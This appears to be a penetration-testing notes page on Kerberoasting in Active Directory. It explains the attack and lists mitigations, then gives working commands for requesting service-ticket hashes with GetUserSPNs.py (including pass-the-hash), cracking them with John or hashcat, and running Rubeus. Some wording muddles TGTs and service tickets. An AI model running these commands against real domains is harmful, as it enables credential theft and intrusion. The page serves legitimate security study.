# Kerberoasting

## Introduction

Kerberos encrypts Ticket Granting Tickets (TGTs) that are provided from the Domain Controller (DC) -- Which typically acts as the Key Distribution Center (KDC) against a user's Kerberos hash. <mark style="color:red;">Kerberoasting</mark> means that <mark style="color:yellow;">a user has a Service Principal Name (SPN) associated with it</mark>. We can then theoretically request the SPN from the DC to send us the hash for us to crack. Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.

Note: You NEED valid credentials inside the domain to perform this attack.

## High-Level Understanding

<figure><img src="../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption></figcaption></figure>

* It is important that we focus on the <mark style="color:yellow;">KRB-TGS-REQ</mark> and <mark style="color:yellow;">KRB-TGS-REP</mark>
* With the <mark style="color:yellow;">REQ portion</mark>, you are requesting the TGT from the TGS
* With the <mark style="color:yellow;">REP portion</mark>, you are obtaining the <mark style="color:yellow;">TGT reply</mark> that is <mark style="color:yellow;">encrypted with the NTLM hash</mark> of the account that the service is running under&#x20;
  * This is typically a <mark style="color:yellow;">SPN</mark>
  * What does this look like?&#x20;
    * <mark style="color:yellow;">mssql\_svc</mark>
    * <mark style="color:yellow;">MSSQL/sql1@htb.local</mark>
    * <mark style="color:yellow;">Service/hostname@domain</mark>
* You can then take the NTLM hash offline (obtained from the Kerberos TGT Reply message) and crack it
* You can <mark style="color:yellow;">execute this attack remotely or locally</mark> as long as you have <mark style="color:yellow;">valid account credentials</mark>

### Mitigation Strategies

* Since kerberoasting takes advantage of the pure nature of Kerberos, there is no official mitigation strategy for it, simply recommendations
* Therefore, enforcing strong and complex passwords throughout your domain is the best way to mitigate this threat
* Rotate these credentials often; expiration times
* Make sure your service accounts are using the least privilege possible
  * Do NOT put these accounts in the domain admins group

## How To

### Get-UserSPNs.py

* Check if the user has a SPN with the following command:

```python
Get-UserSPNs.py -request -dc-ip <IP> search.htb/hope.sharp:IsolationIsKey

# The SPN will appear as RESEARCH/web_svc.search.htb:60001
# You will also get a hash, save it and crack with John

john --wordlist=/usr/share/wordlists/rockyou.txt hash

# Or Hashcat

hashcat -m 13100 -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt
# -a 0 -- Execute dictionary attack against provided details with specified wordlist
```

```
# Domain Account/Credentials Method
GetUserSPNs.py -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted

# Domain Account/Credentials Method w/ Pass The Hash
GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
```

### Grepping for Hashcat Formats

```
hashcat --help | grep etype
```

### Rubeus

```
Rubeus.exe kerberoast
```

## Reference

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast" %}
